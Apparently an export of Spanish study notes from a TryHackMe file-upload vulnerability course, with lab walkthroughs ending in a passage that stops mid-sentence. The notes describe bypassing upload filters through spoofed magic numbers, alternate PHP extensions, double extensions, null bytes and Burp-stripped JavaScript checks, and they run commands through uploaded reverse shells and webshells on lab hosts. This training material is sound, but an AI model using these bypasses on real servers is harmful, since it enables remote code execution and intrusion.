    "content": "Hasta ahora hemos ignorado las defensas empleadas por los desarrolladores web para defenderse contra las vulnerabilidades de subidas de archivos. Desde ahora miraremos algunos de los mecanismos de defensa usados para prevenir la subida de archivos maliciosos y c√≥mo circunvalarlos.\n\n----------------------------------\nPrimero, veamos las diferencias entre filtrado del lado del cliente y del lado del servidor.\n\nCuando hablamos sobre que un script sea \"Client-Side\", en el contexto de las aplicaciones web, nos referimos a que corre en el navegador del usuario en vez de en el propio servidor. JavaScript es pr√°cticamente omnipresente como lenguaje de scripting del lado del cliente aunque existen alternativas. Sin importar el lenguaje, un script del lado del cliente se ejecuta en el navegador. En el contexto de la subida de archivos, esto significa que el filtrado ocurre antes de que el archivo siquiera se suba. Debido a que el filtrado ocurre en nuestro ordenador, es relativamente trivial bypassearlo.\n\nPor el contrario, un script \"Server-Side\", correr√° del lado del servidor. Tradicionalmente, PHP era el lenguaje predominante del lado del servidor. Sin embargo, en los √∫ltimos a√±os, otras opciones como C#, Node.js, Python, Ruby y m√°s, se han empezado a usar ampliamente. El filtrado del lado del servidor tiende a ser m√°s complicado de bypassear ya que no tienes el c√≥digo delante de ti. Por lo general, tendremos que formar un payload que conforme con los filtros pero que nos siga permitiendo ejecutar nuestro c√≥digo.\n\nCon esto en mente veremos algunos diferentes tipos de filtros.\n\n---------------------------------------------\n<h2>Extension Validation</h2>\nLas extensiones se usan (en teor√≠a) para identificar los contenidos deun archivo. En la pr√°ctica son muy f√°ciles de cambiar, por lo que no significan mucho. Sin embargo, MS Windows los utiliza para identificar tipos de archivos, aunque los sistemas UNIX conf√≠an en otros m√©todos. Los filtros que comprueban las extensiones funcionan de una de dos maneras:\n\n- Meten aquellas extensiones especificadas en una lista negra (blacklist).\n- Meten aquellas extensiones especificadas en una lista blanca (whitelist).\n\n-------------------------------------------------------\n<h2>File Type Filtering</h2>\nDe forma similar, pero m√°s intensiva, este tipo de filtro busca verificar que los contenidos del archivo son aceptables para subir. Veremos doos tipos de validaci√≥n de archivos:\n\n- **Validaci√≥n MIME:** Los tipos MIME (Multipurpose Internet Mail Extension) se usan como un identificador para archivos. Originalmente cuando eran transferidos como archivos adjuntos por email, pero ahora tambi√©n cuando los archivos son transferidos por HTTP(S). El tipo MIME de un archivo subido est√° adjunto en la cabecera de la petici√≥n y se ve as√≠:\n  \n  ![[Pasted image 20251215114336.png]]\n  \n  Los tipos MIME siguen el formato `<type>/<subtype>`. En la petici√≥n de arriba, puedes ver que la imagen \"spaniel.jpg\" se subi√≥ al servidor. Como es una imagen JPEG leg√≠tima, el tipo MIME para esta subida es \"image/jpeg\". El tipo MIME para un archivo puede ser comprobado del lado del cliente y/o del servidor. Sin embargo, como MIME est√° basado en la extensi√≥n del archivo, es extremadamente f√°cil de sobrepasar.\n- **Validaci√≥n Magic Number:** Los magic numbers son una forma m√°s precisa de determinar los contenidos de un archivo. Aqunue no son imposibles de falsificar. El \"magic number\" de un archivo es una string de bytes al comienzo del contenido que identifica el contenido. Por ejemplo, un archivo PNG tendr√≠a estos bytes arriba del archivo: `89 50 4E 47 0D 0A 1A 0A`.\n  \n  ![[Pasted image 20251215115706.png]]\n  \n  Al contrario que Windows, los sistemas UNIX usan magic numbers para identificar archivos. Sin embargo, al lidiar con archivos subidos, es posible comprobar los magic numbers en el archivo subido para asegurar que es seguro de aceptar. Esto no es ni de cerca una soluci√≥n garantizada pero es m√°s efectiva que la de arriba.\n\n----------------------------------------------\n<h2>File Length Filtering</h2>\nLos filtros de longitud se usan para prevenir archivos gigantes de ser subidos al servidor via formulario de subida (ya que puede causar starvation a recursos del servidor). Esto no ser√° un problema normalmente al subir shells. Sin embargo, cabe tener en mente que si se espera un archivo muy peque√±o puede llegar a serlo.\n\n---------------------------------------\n<h2>File Name Filtering</h2>\nComo ya hemos mencionado, los archivos subidos a un servidor deber√≠an de ser √∫nicos. Esto suele significar a√±adir alg√∫n aspecto random al nombre del archivo. Sin embargom una estrategia alternativa ser√≠a comprobar si un archivo con el mismo nombre ya existe en el servidor y dar un error si as√≠ es. Adem√°s el nombre de los archivos deber√≠a ser sanitizado para asegurar que no contienen caracteres \"malos\" que podr√≠an causar problemas en el sistema de ficherors al subirse (null bytes, caracteres de control como `;`, etc.). \n\n>[!NOTE] Si esto ocurre en un sistema, es probable que la shell que subiste no tenga el mismo nombre que antes de subirla.\n\n-----------------------------------------------------\n<h2>File Content Filtering</h2>\nSistemas de filtrado m√°s complejos pueden escanear el contenido entero de un archivo subido para asegurar que no est√° suplantando la extensi√≥n, tipo MIME o Magic Number. Es un proceso bastante m√°s complejo que el de la mayor√≠a de sistemas de filtrado que hay, por lo que no lo cubriremos en esta tarea, pero existen.\n\n---------------------------------------------\nEs importante dejar claro que ninguno de estos filtros es perfecto en s√≠ mismo. Normalmente ser√°n usados en conjunto, ofreciendo un filtro de m√∫ltiples capas. Cualquiera de estos puede ser aplicado del lado del cliente, del servidor o ambos.\n\nAdem√°s, diferentes frameworks y lenguajes vienen con sus propios m√©todos de filtrado y validaci√≥n de archivos subidos. Como resultado, es posible que aparezcan exploits de lenguajes espec√≠ficos, por ejemplo, hasta la versi√≥n 5 de PHP era posible bypassear el filtro de extensi√≥n mediante el null byte (`%00`) seguido de una extensi√≥n v√°lida.",
    "modified": "2025-12-16T00:54:19"
  },
  {
    "title": "11. Challenge",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/11-challenge/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/11. Challenge.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
    "content": "Navega hasta `jewel.uploadvulns.thm` y encuentra la flag en `/var/www`.\n\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251218141614.png]]\n   Si nos quedamos unos segundos parados, podemos ver que en realidad las im√°genes se van moviendo, es decir, que es un carrusel que la p√°gina va cargando. Por desgracia, en el html de la p√°gina no pone desde d√≥nde se est√°n cargando estas im√°genes.\n2. Vamos a lanzar un escaneo contra la p√°gina.\n   ![[Pasted image 20251218144822.png]]\n3. Buscaremos filtros JavaScript del lado del cliente.\n   ![[Pasted image 20251218142004.png]]\n   Meti√©ndonos en el Debugger, podemos observar algunos scripts JavaScript. En concreto uno que se llama `upload.js` nos da una pista de que est√° siendo llamado al intentar subir un archivo. Si revisamos el script, tiene hasta comentarios por lo que no hace ni falta saber JS. Est√° utilizando:\n\t1. Un filtro de tama√±o.\n\t2. Un filtro de Magic Numbers.\n\t3. Un filtro de extensi√≥n de archivo.\n4. Vamos a intentar subir nuestro archivo `reverseshell.php`.\n\t1. Primero vamos a modificar el archivo para que se ajuste a nuestra IP y puerto (`/usr/share/webshells/php/php-reverse-shell.php`). Y ahora vamos a cambiarle la extensi√≥n a `.jpg`.\n\t   ![[Pasted image 20251218153533.png]]\n\t2. Ahora modificamos los magic numbers con `hexeditor`.\n\t   ![[Pasted image 20251218153801.png]]\n\t3. Lo guardamos y lo subimos.\n\t   ![[Pasted image 20251218153839.png]]\n\t   Vaya, parece que hemos sobrepasado del tir√≥n los filtros del lado del cliente y del lado del servidor. Porque no olvidemos que acabamos de subir una reverse shell.\n5. Si nos fijamos en el escaneo podemos ver unas cuantas p√°ginas interesantes. La m√°s interesante parece `/admin`.\n   ![[Pasted image 20251218154737.png]]\n   Parece una p√°gina que ejecuta c√≥digo.\n6. Tambi√©n hay otra que se llama `/content`. Si combinamos esta informaci√≥n con lo que pod√≠amos ver en el apartado de \"Network\" en la p√°gina del carrusel podemos ver el tipo de nombre que tienen las im√°genes guardadas en este directorio.\n   ![[Pasted image 20251218154939.png]]\n   Ademas nos dan un diccionario en la actividad que va desde `AAA ‚Üí ZZZ`.\n7. Vamos a lanzar un escaneo de archivos `.jpg` con dicho diccionario sobre `jewel.uploadvulns.thm/content/`.\n   ![[Pasted image 20251218155445.png]]\n8. Bas√°ndonos en el tama√±o de nuestra shell, podemos concretar que `YBW.jpg` es, de hecho, nuestra shell.\n   ![[Pasted image 20251218155556.png]]\n9. Nos ponemos en escucha.\n   ![[Pasted image 20251218155646.png]]\n10. Volvemos a la p√°gina de `/admin` e intentaremos ejecutar nuestra shell.\n    ![[Pasted image 20251218155719.png]]\n11. Parece que no funciona.\n    ![[Pasted image 20251218160030.png]]\n12. Hacemos m√°s reconocimiento.\n    ![[Pasted image 20251218160056.png]]\n    Parece que no usa PHP, sino Node.js, hay que cambiar de reverse shell.\n13. Vamos a [Reverse Shell Generator](https://www.revshells.com/).\n    ![[Pasted image 20251218160519.png]]\n14. Realizamos el proceso de modificaci√≥n de extensi√≥n y magic numbers entero otra vez, subimos el archivo nuevo y realizamos otro escaneo con el diccionario proporcionado.\n    ![[Pasted image 20251218161220.png]]\n    Bas√°ndonos en el escaneo anterior podemos determinar que el archivo que acabamos de subir es `CDB.jpg`.\n15. Cargamos el archivo nuevo estando en escucha.\n    ![[Pasted image 20251218161339.png]]\n    Tampoco ha funcionado.\n    ![[Pasted image 20251218160030.png]]\n16. Vamos a probar con una shell de [Payloads All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#nodejs). Repetimos los pasos.\n    ![[Pasted image 20251218160030.png]]\n17. Tampoco ha funcionado por lo que debe ser un tema de los magic numbers. Para evitar tener que ponerlos tenemos que usar Burp Suite para quitar ese JS que bloquea del lado del cliente.\n\t1. Abrimos Burp Suite y le damos a `Proxy ‚Üí Proxy settings`.\n\t   ![[Pasted image 20251218163135.png]]\n\t2. Ah√≠ le damos a la primera l√≠nea y a \"Edit\".\n\t   ![[Pasted image 20251218163348.png]]\n\t3. Eliminamos `^js$|`.\n\t   ![[Pasted image 20251218163425.png]]\n\t4. Capturamos las peticiones de la p√°gina de subida. **ES MUY IMPORTANTE RECARGAR LA CACHE (`Ctrl+Shift+R`)**.\n\t   ![[Pasted image 20251218163657.png]]\n\t5. Le damos a forward hasta que nos aparezca `upload.js` y le damos a intercept this request.\n\t   ![[Pasted image 20251218163913.png]]\n\t6. Le damos a forward y recibiremos la respuesta.\n\t   ![[Pasted image 20251218164008.png]]\n\t7. Eliminamos los checks.\n\t   ![[Pasted image 20251218164048.png]]\n\t8. Le seguimos dando a forward hasta que cargue la p√°gina.\n\t   ![[Pasted image 20251218164128.png]]\n\t9. Ahora vamos a subir la shell de node.js sin los magic numbers.\n\t   ![[Pasted image 20251218153839.png]]\n\t10. Escanearemos el contenido de nuevo.\n\t    ![[Pasted image 20251218164955.png]]\n\t    Sabemos que el archivo es `PYL.jpg`.\n18. Lo ejecutamos.\n    ![[Pasted image 20251218165029.png]]\n19. Leemos la flag.\n    ![[Pasted image 20251218165112.png]]",
    "modified": "2025-12-19T00:53:33"
  },
  {
    "title": "0. Upload Vulnerabilities",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/0-upload-vulnerabilities/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/0. Upload Vulnerabilities.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
    "content": "[[1. Getting Started]]\n[[2. Introduction]]\n[[3. General Methodology]]\n[[4. Overwriting Existing Files]]\n[[5. Remote Code Execution]]\n[[6. Filtering]]\n[[7. Bypassing Client-Side Filtering]]\n[[8. Bypassing Server-Side Filtering - File Extensions]]\n[[9. Bypassing Server-Side Filtering - Magic Numbers]]\n[[10. Example Methodology]]\n[[11. Challenge]]",
    "modified": "2025-12-19T00:53:33"
  },
  {
    "title": "8. Bypassing Server-Side Filtering - File Extensions",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/8-bypassing-server-side-filtering-file-extensions/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/8. Bypassing Server-Side Filtering - File Extensions.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
    "content": "Los filtros del lado del cliente son f√°ciles de sobrepasar porque ves el c√≥digo. Pero ¬øqu√© pasa cuando no puedes verlo? Tenemos que realizar un mont√≥n de pruebas para entender qu√© es lo que est√° pasando por detr√°s para poder crear un payload que se ajuste a las restricciones.\n\nPara la primera parte de esta tarea miraremos un sitio web que est√° usando una blacklist para las extensiones como filtro del lado del servidor. Hay una variedad de formas diferentes en las que esto podr√≠a estar programado, y el bypass a utilizar depende de ello. En el mundo real no ser√≠amos capaces de ver el c√≥digo, pero para este ejemplo usaremos:\n\n```php\n<?php   ¬†¬†¬† \n//Get the extension   ¬†¬†¬† \n$extension = pathinfo($_FILES[\"fileToUpload\"][\"name\"])[\"extension\"];   ¬†¬†¬† \n//Check the extension against the blacklist -- .php and .phtml   ¬†¬†¬† \nswitch($extension){   ¬†¬†¬† ¬†¬†¬† \n\tcase \"php\":   ¬†¬†¬† ¬†¬†¬† \n\tcase \"phtml\":   ¬†¬†¬† ¬†¬†¬† \n\tcase NULL:   ¬†¬†¬† ¬†¬†¬† ¬†¬†¬† \n\t\t$uploadFail = True;   ¬†¬†¬† ¬†¬†¬† ¬†¬†¬† \n\t\tbreak;   ¬†¬†¬† ¬†¬†¬† \n\tdefault:   ¬†¬†¬† ¬†¬†¬† ¬†¬†¬† \n\t\t$uploadFail = False;   ¬†¬†¬† \n}   \n?>\n```\n\nEn esta instancia, el c√≥digo busca el √∫ltimo punto en el nombre del archivo y lo usa para confirmar la extensi√≥n, por lo que eso es lo que trataremos de bypassear. Otras formas en las que el c√≥digo podr√≠a funcionar ser√≠an: buscar el primer punto en el nombre de archivo o partir el nombre por cada punto y ver si hay extensiones no permitidas.\n\nPodemos ver que el c√≥digo est√° filtrando `.php` y `.phtml`, por lo que si queremos subir un script PHP, vamos a tener que encontrar otra extensi√≥n. La [p√°gina de Wikipedia](https://en.wikipedia.org/wiki/PHP) para PHP nos da unas cuantas extensiones comunes que podemos probar. Sin embargo hay algunas m√°s raras que los servidores pueden reconocer todav√≠a. Estas incluyen `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.php-s`, `.pht` y `.phar`. Todos estos bypassean el filtro. Pero parece que el servidor no est√° configurado para reconocerlos como archivos `php`.\n\n![[Pasted image 20251216211116.png]]\n\nEste es el por defecto para los servidores de Apache2. Sin embargo, el sysadmin debe haber cambiado la configuraci√≥n por defecto, por lo que merece la pena probar.\n\nEventualmente, encontramos que la extensi√≥n `.phar` bypassea el filtro y funciona, d√°ndonos una shell.\n\n![[Pasted image 20251216211454.png]]\n\n--------------------------------\nVeamos otro ejemplo, con un filtro diferente. Esta vez, lo haremos completamente black-box.\n\nUna vez m√°s, tenemos nuestro formulario de subida.\n\n![[Pasted image 20251216211556.png]]\n\nEmpezaremos investigando el alcance con un archivo de subida leg√≠timo. Subiremos `spaniel.jpg`, la imagen de antes.\n\n![[Pasted image 20251216211635.png]]\n\nBien, esto nos dice que los archivos JPEG son aceptados. Vamos a probar una que casi al 100% de seguridad ser√° rechazada (`shell.php`).\n\n![[Pasted image 20251216212211.png]]\n\nEfectivamente.\n\nDesde aqu√≠ ya enumeramos, probando t√©cnicas de arriba y tratando, generalmente, de obtener una idea de qu√© acepta o rechaza el filtro.\n\nEn este caso, hemos encontrado que no hay extensiones shell que se ejecuten y no est√©n filtradas, por lo que de vuelta a la pizarra.\n\nEn el ejemplo anterior, vimos que el c√≥digo usaba `pathinfo()` para obtener los √∫ltimos caracteres despu√©s del punto, pero ¬øqu√© pasa si filtra el input ligeramente diferente?\n\nTrataremos de subir un archivo llamado `shell.jpg.php`. Sabemos que los archivos JPEG son aceptados, por lo que ¬øy si el filtro s√≥lo comprueba que la extensi√≥n `.jpg` exista?\n\nEl pseudo c√≥digo de este tipo de filtro podr√≠a verse algo como as√≠:\n\n```pseudocode\nACCEPT FILE FROM THE USER \n-- \nSAVE FILENAME IN VARIABLE userInput   \nIF STRING \".jpg\" IS IN VARIABLE userInput:   ¬†¬†¬† \n\tSAVE THE FILE   \nELSE:   ¬†¬†¬† \n\tRETURN ERROR MESSAGE\n```\n\nCuando probamos a subirlo recibimos un mensaje de √©xito. Navegar hasta el directorio `/uploads` confirma que el payload se subi√≥ exitosamente.\n\n![[Pasted image 20251216213219.png]]\n\nAl activarlo, recibiremos nuestra shell.\n\n![[Pasted image 20251216213236.png]]\n\n---------------------------------------\nEsto no es una lista exhaustiva de vulnerabilidades de subida de archivos relativo a las extensiones. Como en todo en el hacking, buscamos explotar debilidades del c√≥digo escrito por otros. Este puede ser extremadamente √∫nico para la tarea a realizar. Hay un mill√≥n de formas diferentes de implementar la misma funcionalidad cuando se trata de programar.\n\n-------------------------------------------------\nAhora es tu turno, averigua y bypassea el filtro para subir y activar una shell. La flag est√° en `/var/www/`. Ve al sitio `annex.uploadvulns.thm` y comienza.\n\n>[!IMPORTANT] Por primera vez, se ha implementado un esquema de nombramiento aleatorio, por lo que a partir de ahora puede que no todos los directorios sean indexables.\n\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251216224705.png]]\n2. Hacemos un escaneo con `gobuster`.\n   ![[Pasted image 20251216231603.png]]\n3. Volviendo a la p√°gina, parece curiosa, vamos a ver c√≥mo es la sintaxis:\n   ![[Pasted image 20251216224830.png]]\n4. Primero vamos a seleccionar una imagen leg√≠tima.\n   ![[Pasted image 20251216225024.png]]\n5. Lo subimos y obtenemos succesfully.\n   ![[Pasted image 20251216225109.png]]\n6. Vamos a probar con uno que no nos dejar√° (lo m√°s probable).\n   ![[Pasted image 20251216225327.png]]\n7. Lo subimos y obviamente es inv√°lido.\n   ![[Pasted image 20251216225348.png]]\n8. Vamos a seguir mapeando.\n\t1. Con `.jpg`.\n\t   ![[Pasted image 20251216225613.png]]\n\t2. Parece que ha funcionado.\n\t   ![[Pasted image 20251216225648.png]]\n9. Vamos a ver de qu√© se trataba ese directorio `/privacy`.\n   ![[Pasted image 20251216231759.png]]\n   Es donde se guardan los archivos subidos.\n10. Nos ponemos en escucha en el puerto que hayamos especificado.\n    ![[Pasted image 20251216231940.png]]\n11. Le damos a la \"imagen\".\n    ![[Pasted image 20251216232031.png]]\n    Vaya, parece que ha fallado.\n12. Vamos a probar con una webshell.\n    ![[Pasted image 20251216232510.png]]\n13. Voy a probar a meterle el null byte, por si cuela.\n    ![[Pasted image 20251216232636.png]]\n14. A ver si hay suerte.\n    ![[Pasted image 20251216232707.png]]\n    ![[Pasted image 20251216232746.png]]\n    No     :(\n15. Despu√©s de probar un poco vemos que `.php5` sirve como tipo de archivo.\n    ![[Pasted image 20251216233046.png]]\n    ![[Pasted image 20251216233628.png]]\n16. Ahora vamos a la p√°gina, le damos al link y metemos el par√°metro `?cmd=pwd`.\n    ![[Pasted image 20251216233927.png]]\n17. Vamos a listar `/var/www/`.\n    ![[Pasted image 20251216234023.png]]\n18. Leemos la flag.\n    ![[Pasted image 20251216234100.png]]",
    "modified": "2025-12-17T00:48:47"
  },
  {
    "title": "7. Bypassing Client-Side Filtering",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/7-bypassing-client-side-filtering/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/7. Bypassing Client-Side Filtering.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
    "content": "Empezaremos con la primera (y m√°s d√©bil) linea de defensa: filtrado del lado del cliente.\n\nComo mencionamos previamente, el filtrado del lado del cliente suele ser extremadamente f√°cil de bypassear. Como ocurre por completo en la m√°quina que puedes controlar, al tener acceso al c√≥digo es f√°cil de modificar.\n\nHay cuatro maneras f√°ciles de bypassear los t√≠picos filtros de subida del lado del cliente:\n\n1. Deshabilita JavaScript en tu navegador: Esto funcionar√° si el sitio web no requiere JavaScript para ofrecer funcionaliddades b√°sicas.\n2. Intercepta y modifica la p√°gina entrante: Usando Burp Suite, podemos interceptar la p√°gina entrante y quitarle el filtro JavaScript antes de que tenga oportunidad de ejecutarse.\n3. Intercepta y modifica el archivo subido: Este m√©todo permite que la p√°gina se cargue de forma normal pero intercepta el archivo subido despu√©s de haber pasado los filtros pero cuando todav√≠a no ha llegado al servidor.\n4. Manda el archivo directamente al punto de subida: Si puedes mandar el archivo directamente al punto de salida, puedes evitar filtros del navegador. El comando para dicho prop√≥sito ser√≠a algo as√≠: `curl -X POST -F \"submit:<value>\" -F \"<file-parameter>:@<path-to-file>\" <site>`. Para poder usar este m√©todo deber√≠as primero interceptar una petici√≥n de subida exitosa para ver par√°metros, headers y dem√°s.\n\nCubriremos los m√©todos 2 y 3 en profundidad debajo.\n\n-------------------------------------------------\nAsumamos que hemos encontrado una p√°gina de subida.\n\n![[Pasted image 20251215124519.png]]\n\nComo siempre, miraremos el c√≥digo fuente. Aqu√≠ podemos ver una funci√≥n JavaScript b√°sica que comprueba el tipo MIME de los archivos subidos:\n\n![[Pasted image 20251215124652.png]]\n\nEn esta instancia podemos ver que el filtro est√° usando una whitelist para excluir cualquier tipo MIME que no sea `image/jpeg`.\n\nEl pr√≥ximo paso es intentar una subida de archivo. Si seleccionamos JPEG, la funci√≥n lo acepta y cualquier otra la rechaza.\n\nHabiendo establecido esto, arrancamos BurpSuite y recargamos la p√°gina. Veremos nuestra propia petici√≥n al sitio web pero lo que realmente queremos es ver es la respuesta del servidor, as√≠ que hacemos click derecho en la informaci√≥n interceptada, bajamos hasta \"Do Intercept\" y seleccionamos \"Response to this Request\".\n\n![[Pasted image 20251215124935.png]]\n\nCuando hacemos click en \"Forward\" arriba de la ventana, veremos la respuesta del servidor a nuestra petici√≥n. Aqu√≠, podemos borrar, comentar o romper la funci√≥n JavaScript antes de que tenga oportunidad de cargar.\n\n![[Pasted image 20251215125235.png]]\n\nHabiendo borrado la funci√≥n, le damos de nuevo a \"Forward\" hasta que veamos que el sitio web ha terminado de cargarse y ahora ya podemos subir cualquier tipo de archivo a la p√°gina.\n\n![[Pasted image 20251215125327.png]]\n\n>[!IMPORTANT] Burp Suite no intercepta (por defecto) archivos JavaScript externos que la p√°gina cargue. Si necesitas editar un script que no est√© en la p√°gina principal, necesitas ir a `Options > Intercept Client Requests` y editar la condici√≥n de la primera l√≠nea para eliminar `^js$|`:\n\n![[Pasted image 20251215125537.png]]\n\n---------------------------------------------------\nYa hemos bypasseado este filtro interceptando y elimin√°ndolo antes de que cargue la p√°gina, pero intent√©moslo hacer subiendo un archivo con una extensi√≥n y tipo MIME leg√≠timos e intercept√°ndolo y corrigi√©ndolo con BurpSuite.\n\nHabiendo recargado la p√°gina web, para poner el filtro en su lugar, tomemos la reverse shell que hemos usado antes y renombr√©mosla para que se llame \"shell.jpg\". Como el archivo cumple con la condici√≥n del tipo MIME, nuestro filtro del lado del cliente deja pasar nuestro payload sin quejas.\n\n![[Pasted image 20251215130752.png]]\n\nUna vez m√°s, activamos Burp Suite y le damos a \"Upload\" para interceptar la petici√≥n.\n\n![[Pasted image 20251215130825.png]]\n\nObserva que el tipo MIME de nuestra shell PHP es `image/jpeg`. Cambiaremos esto a `text/x-php`, y la extensi√≥n de `.jpg` a `.php` y le daremos a forward.\n\n![[Pasted image 20251215130939.png]]\n\nAhora, al navegar a `http://demo.uploadvulns.thm/uploads/shell.php` habiendo activado un listener, recibiremos una conexi√≥n de la shell.\n\n![[Pasted image 20251215131029.png]]\n\n---------------------------------\nHemos cubierto en detalle dos formas de bypassear un filtro de subida de lado del cliente. Ahora es hora de que lo probemos. Ve a `java.uploadvulns.thm` y bypassea el filtro para conseguir una reverse shell. Recuerda escanear el sitio web con `gobuster`.\n\n1. Vamos al sitio web dado.\n   ![[Pasted image 20251215224146.png]]\n2. Escanearemos mientras tanto la p√°gina con `gobuster`.\n   ![[Pasted image 20251215225918.png]]\n3. Vamos a interceptar una subida de archivo con Burp Suite.\n\t1. Abrimos Burp Suite y su navegador y vamos al sitio web que nos dan.\n\t   ![[Pasted image 20251215224459.png]]\n\t2. Seleccionamos un archivo y activamos la intercepci√≥n.\n\t   ![[Pasted image 20251215224527.png]]\n\t3. Le damos a \"Upload\" y esperamos la petici√≥n.\n\t   ![[Pasted image 20251215224611.png]]\n4. El content type parece ser `image/png`.\n   ![[Pasted image 20251215224721.png]]\n5. Le damos a \"Forward\".\n   ![[Pasted image 20251215224812.png]]\n   Parece que se ha subido exitosamente.\n6. Vamos ahora a subir una `shell.php` y a capturar la respuesta.\n\t1. Editamos la shell.\n\t   ![[Pasted image 20251215225158.png]]\n\t2. Nos ponemos en escucha.\n\t   ![[Pasted image 20251215225244.png]]\n\t3. Subimos la shell y la interceptamos con Burp Suite.\n\t   ![[Pasted image 20251215225330.png]]\n\t   Parece que no nos deja.\n\t4. Le cambiamos la extensi√≥n a `.png`.\n\t   ![[Pasted image 20251215225504.png]]\n\t5. Ahora s√≠.\n\t   ![[Pasted image 20251215225523.png]]\n\t6. Vamos a interceptarlo.\n\t   ![[Pasted image 20251215225558.png]]\n\t7. Cambiamos el filename a `reverseshell.php` y content-type a `text/x-php`.\n\t   ![[Pasted image 20251215225716.png]]\n\t8. Le damos a forward hasta que ponga success.\n\t   ![[Pasted image 20251215225828.png]]\n7. Ahora debemos navegar a la shell, que bas√°ndonos en nuestro escaneo con `gobuster` seguramente est√© en `/images`.\n   ![[Pasted image 20251215230007.png]]\n   La p√°gina parece quedarse cargando.\n8. Pero si volvemos al listener:\n   ![[Pasted image 20251215230034.png]]\n9. Ahora vamos al directorio que nos dan y leemos la flag.\n   ![[Pasted image 20251215230112.png]]",
    "modified": "2025-12-16T00:54:19"
  },
  {
    "title": "1. Getting Started",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/1-getting-started/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/1. Getting Started.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
    "content": ">[!CAUTION] Lee las instrucciones cuidadosamente y s√≠guelas.\n\nEsta tarea te ense√±ar√° a configurar el [archivo de hosts](https://www.ionos.co.uk/digitalguide/server/configuration/hosts-file/) de tu dispositivo. El archivo hosts se usa para mapear, bypasseando el DNS. Es decir, permite relacionar un dominio con una IP sin necesidad de pasar por un DNS. Es extremadamente √∫til en entornos donde el DNS no est√° disponible, como TryHackMe.\n\n------------------------------------------\nPrimero desplegamos la m√°quina y le damos unos 5 minutos para arrancar.\n\nAhora usando una sesi√≥n administrativa y tu editor de texto favorito, abre el archivo `hosts` de tu equipo:\n\n- En Linux y MacOS se encuentra en `/etc/hosts`.\n- En Windows est√° en `C:\\Windows\\System32\\drivers\\etc\\hosts`.\n\nA√±ade la siguiente l√≠nea (en singular) al final del archivo.\n\n`10.80.160.47 ¬†¬† overwrite.uploadvulns.thm shell.uploadvulns.thm java.uploadvulns.thm annex.uploadvulns.thm magic.uploadvulns.thm jewel.uploadvulns.thm demo.uploadvulns.thm`\n\nLa sintaxis es `IP + TAB + Dominio` --> `192.168.2.1    dominio.com`.\n\n>[!IMPORTANT] Cuando termines de usar la m√°quina aseg√∫rate de eliminar la l√≠nea.",
    "modified": "2025-12-14T00:57:26"
  },
  {
    "title": "5. Remote Code Execution",
    "path": "/apuntes/thm/1-career/2-penetration-tester/2-web-fundamentals/4-web-hacking-fundamentals/8-upload-vulnerabilities/5-remote-code-execution/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/2. Web Fundamentals/4. Web Hacking Fundamentals/8. Upload Vulnerabilities/5. Remote Code Execution.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 2. Web Fundamentals > 4. Web Hacking Fundamentals > 8. Upload Vulnerabilities",
    "content": "RCE nos permitir√≠a ejecutar c√≥digo de manera arbitraria en el servidor. Aunque esto es m√°s probable que pase con un usuario con bajos privilegios como `www-data`, sigue siendo una vulnerabilidad muy seria. Tiende a ser explotado subiendo un programa en el mismo lenguaje que el backend. Este sol√≠a ser PHP, sin embargo, en tiempos m√°s modernos, otros lenguajes backend se han impuesto (como Python Django y JavaScript en forma de Node.js).\n\n>[!IMPORTANT] En routed applications (aquellas donde las rutas de archivos son generadas din√°micamente) es m√°s dif√≠cil para los atacantes explotar este tipo de vulnerabilidades ya que no pueden predecir el path de los archivos.\n\nHay dos manera principales de conseguir una RCE en un servidor web: webshells y reverse/bind shells. Idealmente, bind/reverse shells es el escenario perfecto para un atacante. Sin embargo, puede que tu √∫nica opci√≥n sea una webshell. Primero subimos el archivo y luego lo intentamos ejecutar, ya sea navegando directamente hacia √©l si el servidor lo permite o forzando a al app a que lo cargue.\n\n-------------------------------------------\n<h2>WebShells</h2>\nAsumamos que hemos encontrado una p√°gina con un formulario de subida:\n\n![[Pasted image 20251214170645.png]]\n\n¬øQu√© hacemos ahora? Bien empezaremos con un escaneo de `gobuster`:\n\n![[Pasted image 20251214170714.png]]\n\nParece que tenemos dos directorios: `uploads` y `assets`. Parece que cualquier archivo que subamos se subir√° al directorio 